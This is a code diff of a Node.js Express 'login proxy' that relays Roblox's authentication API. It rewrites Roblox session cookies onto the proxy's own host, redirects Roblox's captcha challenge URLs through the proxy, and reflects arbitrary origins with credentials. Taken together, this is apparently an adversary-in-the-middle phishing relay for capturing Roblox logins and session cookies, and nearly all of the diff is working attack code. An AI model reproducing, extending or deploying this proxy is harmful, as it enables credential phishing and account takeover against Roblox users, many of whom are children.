@@ -6,7 +6,7 @@ const http = require('http');
 const app = express();
 
 console.log('='.repeat(60));
-console.log('🔒 PURE LOGIN PROXY - FIXED CHALLENGE HANDLING');
+console.log('🔒 PURE LOGIN PROXY - CHALLENGE URL REWRITE');
 console.log('='.repeat(60));
 
 // Shared HTTPS agent with keep-alive for connection pooling
@@ -74,55 +74,34 @@ function rewriteCookies(cookies, host) {
     });
 }
 
-function setCorsHeaders(proxyRes, req, res) {
-    const origin = req.headers['origin'] || `https://${req.headers.host}`;
-    
-    // Set on response object (for direct responses)
-    if (res) {
-        res.set('Access-Control-Allow-Origin', origin);
-        res.set('Access-Control-Allow-Credentials', 'true');
-        res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
-        res.set('Access-Control-Allow-Headers', [
-            'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id', 'rbxdeviceid',
-            'x-bound-auth-token', 'Accept', 'Accept-Language', 'Accept-Encoding',
-            ...CHALLENGE_HEADERS
-        ].join(', '));
-        res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
-    }
-    
-    // Set on proxy response (for proxied responses)
-    if (proxyRes) {
-        delete proxyRes.headers['access-control-allow-origin'];
-        delete proxyRes.headers['access-control-allow-credentials'];
-        delete proxyRes.headers['access-control-allow-methods'];
-        delete proxyRes.headers['access-control-allow-headers'];
-        delete proxyRes.headers['access-control-expose-headers'];
-
-        proxyRes.headers['access-control-allow-origin'] = origin;
-        proxyRes.headers['access-control-allow-credentials'] = 'true';
-        proxyRes.headers['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, OPTIONS, PATCH';
-        proxyRes.headers['access-control-allow-headers'] = [
-            'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id', 'rbxdeviceid',
-            'x-bound-auth-token', 'Accept', 'Accept-Language', 'Accept-Encoding',
-            ...CHALLENGE_HEADERS
-        ].join(', ');
-        proxyRes.headers['access-control-expose-headers'] = ['x-csrf-token', ...CHALLENGE_HEADERS].join(', ');
-    }
-}
-
-function isChallengeResponse(body) {
-    try {
-        const parsed = JSON.parse(body);
-        return parsed?.errors?.[0]?.code === 0 &&
-               parsed?.errors?.[0]?.message?.toLowerCase().includes('challenge');
-    } catch (_) { return false; }
-}
-
 function getDeviceId(req) {
     const cookies = req.headers.cookie || '';
     const match = cookies.match(/rbx-device-id=([^;]+)/);
     if (match) return match[1];
     return Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
+}
+
+// Rewrite URLs in challenge metadata
+function rewriteChallengeMetadata(metadata, host) {
+    try {
+        // Decode base64
+        const decoded = Buffer.from(metadata, 'base64').toString('utf8');
+        let data = JSON.parse(decoded);
+        
+        // Rewrite challenge URL if present
+        if (data.challengeUrl) {
+            data.challengeUrl = data.challengeUrl.replace('https://challenge.roblox.com', `https://${host}/challenge`);
+        }
+        if (data.challengeBaseUrl) {
+            data.challengeBaseUrl = data.challengeBaseUrl.replace('https://challenge.roblox.com', `https://${host}/challenge`);
+        }
+        
+        // Re-encode
+        return Buffer.from(JSON.stringify(data)).toString('base64');
+    } catch (e) {
+        console.log('   Failed to rewrite challenge metadata:', e.message);
+        return metadata;
+    }
 }
 
 async function doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, extraHeaders, maxRetries = 2) {
@@ -198,9 +177,9 @@ function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
 }
 
 // =========================
-// LOGIN HANDLER - Fixed challenge forwarding
+// LOGIN HANDLER
 // =========================
-app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res) => {
+app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => {
     if (req.method !== 'POST') {
         return res.status(405).send('Method not allowed');
     }
@@ -211,21 +190,54 @@ app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res) =>
     const origin = req.headers['origin'] || `https://${host}`;
     const deviceId = getDeviceId(req);
 
-    const hasSolution = !!req.headers['rblx-challenge-id'];
-    console.log(`🔑 LOGIN | Challenge from browser: ${hasSolution ? 'YES' : 'NO'}`);
+    // Check if this is a challenge retry from browser
+    const hasChallengeSolution = req.headers['rblx-challenge-id'];
+    console.log(`🔑 LOGIN | Challenge solution from browser: ${hasChallengeSolution ? 'YES' : 'NO'}`);
 
     try {
-        const bodyStr = JSON.stringify(req.body);
+        const bodyStr = req.body.toString('utf8');
 
-        // Step 1: Get CSRF token
+        // If browser sent challenge solution, forward directly to Roblox
+        if (hasChallengeSolution) {
+            console.log('   Forwarding challenge solution to Roblox...');
+            
+            // Need CSRF token first
+            const tokenFetch = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
+            const csrfToken = tokenFetch.headers['x-csrf-token'];
+            
+            if (!csrfToken) {
+                console.log('   No CSRF token available');
+                return forwardResponse(res, tokenFetch, host, origin, deviceId);
+            }
+
+            // Now do the actual login with challenge solution
+            let cookieHeader = incomingCookies;
+            if (tokenFetch.headers['set-cookie']) {
+                const extra = tokenFetch.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
+                cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
+            }
+
+            const result = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
+            console.log(`   Challenge login result: ${result.status}`);
+            
+            if (result.status === 200) {
+                console.log('✅ LOGIN SUCCESS (with challenge)');
+            } else {
+                console.log(`❌ LOGIN FAILED: ${result.status}`);
+            }
+            
+            return forwardResponse(res, result, host, origin, deviceId);
+        }
+
+        // Step 1: Get CSRF token (always needed first)
         const first = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
         console.log(`   Step 1: ${first.status} | CSRF: ${first.headers['x-csrf-token'] ? 'YES' : 'NO'}`);
 
         if (!first.headers['x-csrf-token']) {
-            // No CSRF token, return first response directly
-            return sendDirectResponse(res, first, host, origin, deviceId);
+            return forwardResponse(res, first, host, origin, deviceId);
         }
 
+        // Step 2: Login with CSRF
         const csrfToken = first.headers['x-csrf-token'];
         let cookieHeader = incomingCookies;
         if (first.headers['set-cookie']) {
@@ -233,15 +245,8 @@ app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res) =>
             cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
         }
 
-        // Step 2: Login with CSRF token
         const second = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
         console.log(`   Step 2: ${second.status}`);
-
-        // Handle challenge required
-        if (second.status === 403 && isChallengeResponse(second.body)) {
-            console.log('   🧩 Arkose challenge required - forwarding to browser');
-            return sendDirectResponse(res, second, host, origin, deviceId);
-        }
 
         // Handle token rotation
         let finalResponse = second;
@@ -261,11 +266,13 @@ app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res) =>
 
         if (finalResponse.status === 200) {
             console.log('✅ LOGIN SUCCESS');
+        } else if (finalResponse.status === 403 && finalResponse.headers['rblx-challenge-id']) {
+            console.log('   🧩 Challenge required');
         } else {
-            console.log(`❌ LOGIN FAILED: ${finalResponse.status}`);
+            console.log(`❌ Response: ${finalResponse.status}`);
         }
 
-        sendDirectResponse(res, finalResponse, host, origin, deviceId);
+        forwardResponse(res, finalResponse, host, origin, deviceId);
 
     } catch (err) {
         console.error('[login] Error:', err.message);
@@ -273,32 +280,46 @@ app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res) =>
     }
 });
 
-// Send response directly with all headers properly set
-function sendDirectResponse(res, response, host, origin, deviceId) {
+// Forward response with all headers intact
+function forwardResponse(res, response, host, origin, deviceId) {
     const status = response.status;
-    const body = response.body;
-    const responseHeaders = response.headers;
+    let body = response.body;
+    const headers = response.headers;
 
-    // Set CORS headers
+    // Rewrite challenge metadata if present
+    if (headers['rblx-challenge-metadata']) {
+        const original = headers['rblx-challenge-metadata'];
+        const rewritten = rewriteChallengeMetadata(original, host);
+        if (rewritten !== original) {
+            console.log('   Rewrote challenge metadata URLs');
+            headers['rblx-challenge-metadata'] = rewritten;
+        }
+    }
+
+    // Set CORS headers FIRST (before other headers)
     res.set('Access-Control-Allow-Origin', origin);
     res.set('Access-Control-Allow-Credentials', 'true');
     res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
 
-    // Forward challenge headers (CRITICAL for captcha to work)
-    for (const h of CHALLENGE_HEADERS) {
-        if (responseHeaders[h]) {
-            res.set(h, responseHeaders[h]);
-            console.log(`   📤 Forwarding header: ${h}`);
+    // Forward important response headers from Roblox
+    const headersToForward = [
+        'x-csrf-token',
+        'rblx-challenge-id',
+        'rblx-challenge-type', 
+        'rblx-challenge-metadata',
+        'rblx-challenge-solution',
+        'content-type',
+        'cache-control',
+    ];
+    
+    for (const key of headersToForward) {
+        if (headers[key]) {
+            res.set(key, headers[key]);
         }
     }
 
-    // Forward CSRF token
-    if (responseHeaders['x-csrf-token']) {
-        res.set('X-CSRF-TOKEN', responseHeaders['x-csrf-token']);
-    }
-
     // Handle cookies
-    const cookies = responseHeaders['set-cookie'];
+    const cookies = headers['set-cookie'];
     let allCookies = rewriteCookies(cookies, host) || [];
     
     // Add device ID cookie
@@ -310,7 +331,11 @@ function sendDirectResponse(res, response, host, origin, deviceId) {
         res.set('Set-Cookie', allCookies);
     }
 
-    res.set('Content-Type', 'application/json');
+    // Ensure content-type is set
+    if (!headers['content-type']) {
+        res.set('Content-Type', 'application/json');
+    }
+
     res.status(status).send(body);
 }
 
@@ -440,7 +465,17 @@ function createRobloxProxy(prefix, target) {
                     const host = req.headers.host || 'localhost';
                     proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                 }
-                setCorsHeaders(proxyRes, req);
+                
+                const origin = req.headers['origin'] || `https://${req.headers.host}`;
+                proxyRes.headers['access-control-allow-origin'] = origin;
+                proxyRes.headers['access-control-allow-credentials'] = 'true';
+                proxyRes.headers['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, OPTIONS, PATCH';
+                proxyRes.headers['access-control-allow-headers'] = [
+                    'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id', 'rbxdeviceid',
+                    'x-bound-auth-token', 'Accept', 'Accept-Language', 'Accept-Encoding',
+                    ...CHALLENGE_HEADERS
+                ].join(', ');
+                proxyRes.headers['access-control-expose-headers'] = ['x-csrf-token', ...CHALLENGE_HEADERS].join(', ');
             },
 
             error: (err, req, res) => {
